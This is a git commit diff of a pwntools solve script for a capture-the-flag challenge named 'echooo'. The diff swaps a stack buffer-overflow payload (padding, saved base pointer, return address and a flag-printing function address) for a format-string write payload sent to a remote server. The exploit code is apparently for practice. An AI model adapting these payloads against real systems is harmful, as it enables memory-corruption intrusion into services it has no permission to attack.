91d9050f57add5e93d1b0a5320345c857f8169fd
lon5948 <a0988282303@gmail.com>
2023-06-03 20:27:50 +0800

    finish

--- echooo/solve.py
+++ echooo/solve.py
@@ -11,11 +11,7 @@ if __name__ == '__main__':
         port = int(sys.argv[2])
         target = pwn.remote(server, port)  # Connect to the server
 
-    mainrbp = pwn.p64(0x7fffffffd9e0)
-    return_addr = pwn.p64(0x401a11)
-    bottom = pwn.p64(0x4a3e10)
-    putflag_addr = pwn.p64(0x4017f5)
-    attack = b'0' * 16 + mainrbp + return_addr + bottom + putflag_addr 
+    attack = pwn.fmtstr_payload(4, { 0x80e419c: 1 })
     target.sendline(attack)
-    a = target.recvuntil(b'?')
+    a = target.recvuntil(b':')
     print(target.recvall().decode("utf-8", "ignore").strip())
